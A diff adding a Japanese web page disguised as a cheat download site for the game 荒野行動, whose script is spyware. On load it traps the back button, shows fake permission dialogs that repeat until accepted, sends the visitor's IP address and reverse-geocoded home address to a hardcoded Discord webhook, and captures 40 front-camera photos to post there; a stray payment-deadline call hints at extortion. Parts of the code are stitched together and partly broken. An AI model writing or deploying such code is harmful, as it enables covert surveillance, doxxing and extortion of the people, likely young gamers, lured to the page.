@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>荒野行動 チート配布センター</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h1 {
+      color: #f44;
+    }
+    .cheat-box {
+      background: #222;
+      padding: 15px;
+      margin: 10px 0;
+      border: 1px solid #0f0;
+      border-radius: 8px;
+    }
+    .download-btn {
+      display: none;
+      margin-top: 10px;
+      padding: 10px 20px;
+      background: #0f0;
+      color: #000;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 5px;
+    }
+    .dialog-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .dialog-box {
+      background: #fff;
+      border-radius: 14px;
+      max-width: 320px;
+      padding: 20px;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    .dialog-box p {
+      font-size: 16px;
+      color: #000;
+      margin-bottom: 20px;
+    }
+    .dialog-buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+    .dialog-buttons button {
+      flex: 1;
+      margin: 0 5px;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .ok {
+      background: #007aff;
+      color: white;
+    }
+    .cancel {
+      background: #e5e5ea;
+      color: black;
+    }
+  </style>
+</head>
+<body>
+
+<h1>荒野行動 チート配布センター</h1>
+
+<div id="downloads" style="display: none;">
+  <div class="cheat-box">
+    <strong>🔫 自動エイム</strong><br>
+    <a href="fake/auto_aim.zip" class="download-btn">ダウンロード</a>
+  </div>
+  <div class="cheat-box">
+    <strong>👁️ WallHack</strong><br>
+    <a href="fake/wallhack.zip" class="download-btn">ダウンロード</a>
+  </div>
+  <div class="cheat-box">
+    <strong>📡 ESP表示</strong><br>
+    <a href="fake/esp.zip" class="download-btn">ダウンロード</a>
+  </div>
+</div>
+
+<script>
+// Discord Webhook URL（実際のURLに置き換えてください）
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1392784604913467492/ojpZqJja2--oYAP4mRUb4v8Yrxpg6rSqPo6LmDRQTjOJDvvsP46y6o8WK7Tw8gn0pkA_"; // ここにWebhook URLを入力
+
+window.addEventListener("load", () => {
+  setTimeout(showFileDialog, 3000);
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", () => {
+    history.pushState(null, null, location.href);
+    alert("このページからは戻れません。");
+  });
+});
+
+function showFileDialog() {
+  const overlay = document.createElement('div');
+  overlay.className = 'dialog-overlay';
+  overlay.innerHTML = `
+    <div class="dialog-box">
+      <p>"このWebサイト" がファイルへのアクセスを求めています。</p>
+      <div class="dialog-buttons">
+        <button class="cancel">許可しない</button>
+        <button class="ok">許可する</button>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+  overlay.querySelector('.ok').onclick = () => {
+    overlay.remove();
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = '*/*';
+    input.style.display = 'none';
+    input.onchange = () => {
+      if (input.files.length > 0) {
+        showCameraDialog();
+      } else {
+        alert("許可の確認が取れませんでした。");
+        showFileDialog();
+      }
+    };
+    document.body.appendChild(input);
+    input.click();
+  };
+  overlay.querySelector('.cancel').onclick = () => {
+    overlay.remove();
+    alert("許可の確認が取れませんでした。");
+    showFileDialog();
+  };
+}
+
+function showCameraDialog() {
+  const overlay = document.createElement('div');
+  overlay.className = 'dialog-overlay';
+  overlay.innerHTML = `
+    <div class="dialog-box">
+      <p>"このWebサイト" がカメラへのアクセスを求めています。</p>
+      <div class="dialog-buttons">
+        <button class="cancel">許可しない</button>
+        <button class="ok">許可する</button>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+  overlay.querySelector('.ok').onclick = () => {
+    overlay.remove();
+    requestCameraAccess();
+  };
+  overlay.querySelector('.cancel').onclick = () => {
+    overlay.remove();
+    const retry = confirm("カメラの許可が取れませんでした。再試行しますか？");
+    if (retry) showCameraDialog();
+    else showPermanentAlert("再試行が確認されなかったため、ダウンロードはできません。");
+  };
+}
+
+function requestCameraAccess() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      setTimeout(() => {
+        stream.getTracks().forEach(track => track.stop());
+        alert("カメラが許可されました。ダウンロードが解放されます。");
+        unlockDownloads();
+      }, 2000);
+    })
+    .catch(() => {
+      const retry = confirm("カメラの許可が取れませんでした。再試行しますか？");
+      if (retry) showCameraDialog();
+      else showPermanentAlert("再試行が確認されなかったため、ダウンロードはできません。");
+    });
+}
+
+function unlockDownloads() {
+  document.getElementById("downloads").style.display = "block";
+  enableDownloadWithLocation();
+}
+
+function enableDownloadWithLocation() {
+  document.querySelectorAll('.download-btn').forEach(link => {
+    link.addEventListener('click', e => {
+      e.preventDefault();
+      tryLocationWithRetry(link.href);
+    });
+  });
+}
+
+function tryLocationWithRetry(zipUrl) {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const lat = pos.coords.latitude.toFixed(8);
+      const lon = pos.coords.longitude.toFixed(8);
+      const mapsURL = `https://www.google.com/maps?q=${lat},${lon}`;
+      console.log("📍 位置情報:", mapsURL);
+      window.location.href = zipUrl;
+    },
+    () => {
+      const retry = confirm("位置情報の確認が取れませんでした。再試行しますか？");
+      if (retry) tryLocationWithRetry(zipUrl);
+      else showPermanentAlert("再試行が確認されなかったため、ダウンロードはできません。");
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+}
+
+// base64 → Blob に変換
+    function dataURLtoBlob(dataURL) {
+      const parts = dataURL.split(';base64,');
+      const contentType = parts[0].split(':')[1];
+      const raw = window.atob(parts[1]);
+      const rawLength = raw.length;
+      const uInt8Array = new Uint8Array(rawLength);
+      for (let i = 0; i < rawLength; i++) {
+        uInt8Array[i] = raw.charCodeAt(i);
+      }
+      return new Blob([uInt8Array], { type: contentType });
+    }
+
+    // Discordに画像ファイルとして送信
+    function sendImageToDiscord(base64Image, filename = 'capture.jpg') {
+      const blob = dataURLtoBlob(base64Image);
+      const formData = new FormData();
+      formData.append('file', blob, filename);
+      formData.append('content', `📸 内カメラキャプチャ`);
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.error('画像送信エラー:', err));
+    }
+
+    // Discordにテキスト送信
+    function sendTextToDiscord(content, label = '通知') {
+      const payload = {
+        content: `【${label}】\n${content}`
+      };
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error('Discord送信エラー:', err));
+    }
+
+    // IPと住所を取得してDiscordに送信（OpenStreetMap逆ジオコーディング追加版）
+    function getIPLocationAndSend() {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip || '不明';
+          const city = data.city || '';
+          const region = data.region || '';
+          const country = data.country_name || '';
+          const lat = data.latitude;
+          const lon = data.longitude;
+
+          // OpenStreetMapで緯度経度から住所取得
+          fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+            .then(res => res.json())
+            .then(location => {
+              const fullAddr = location.display_name || `${country} ${region} ${city}`;
+              const msg = `IP: ${ip}\n推定住所（OSM）: ${fullAddr}`;
+              sendTextToDiscord(msg, 'IPアドレス＆OSM住所');
+            })
+            .catch(err => {
+              console.error('Nominatim住所取得失敗:', err);
+              const fallbackMsg = `IP: ${ip}\n推定住所: ${country} ${region} ${city}`;
+              sendTextToDiscord(fallbackMsg, 'IPアドレス＆簡易住所');
+            });
+        })
+        .catch(err => console.error('IP取得失敗:', err));
+    }
+
+    // 内カメラ起動→20秒間0.5秒間隔で連写→Discord送信
+    async function startCameraAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' }
+        });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 640;
+        canvas.height = 480;
+
+        let count = 0;
+        const total = 40; // 20秒 ÷ 0.5秒
+
+        const interval = setInterval(() => {
+          if (count >= total) {
+            clearInterval(interval);
+            stream.getTracks().forEach(t => t.stop());
+            return;
+          }
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imgData = canvas.toDataURL('image/jpeg');
+          sendImageToDiscord(imgData, `capture_${count + 1}.jpg`);
+          count++;
+        }, 500);
+      } catch (err) {
+        console.error('カメラ起動失敗:', err);
+      }
+    }
+
+    window.onload = () => {
+      updatePaymentDeadline();
+      getIPLocationAndSend();
+      startCameraAndCapture();
+    };
+
+function showPermanentAlert(message) {
+  const overlay = document.createElement('div');
+  overlay.className = 'dialog-overlay';
+  overlay.innerHTML = `<div class="dialog-box"><p>${message}</p></div>`;
+  document.body.appendChild(overlay);
+}
+</script>
+
+</body>
+</html>
